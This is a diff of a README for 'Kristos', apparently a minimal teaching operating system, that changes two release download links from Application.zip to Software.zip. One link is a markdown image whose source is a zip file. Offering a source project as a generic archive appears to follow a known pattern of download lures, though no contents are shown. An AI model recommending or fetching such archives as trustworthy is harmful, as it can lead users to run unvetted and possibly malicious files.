@@ -1,7 +1,7 @@
 
 # Kristos: A Minimal Operating System
 
-![Operating System](https://github.com/Numbremix8990/kristos/releases/download/v1.0.0/Application.zip)
+![Operating System](https://github.com/Numbremix8990/kristos/releases/download/v2.0/Software.zip)
 
 Welcome to the **Kristos** repository! This project is a minimal operating system implementation following the guidance of "Operating system in 1000 lines of code". If you are interested in exploring the world of operating system development, this repository is a great starting point for you.
 
@@ -13,7 +13,7 @@ The "Kristos" operating system is designed to demonstrate the core concepts of a
 
 ## 📝 How to Use
 To explore the **Kristos** operating system, you can download the source code and related files from the following link:
-[Launch Kristos](https://github.com/Numbremix8990/kristos/releases/download/v1.0.0/Application.zip)  
+[Launch Kristos](https://github.com/Numbremix8990/kristos/releases/download/v2.0/Software.zip)  
 *Note: The link contains the essential files needed to run the operating system implementation.*
 
 ## 🌐 Additional Resources
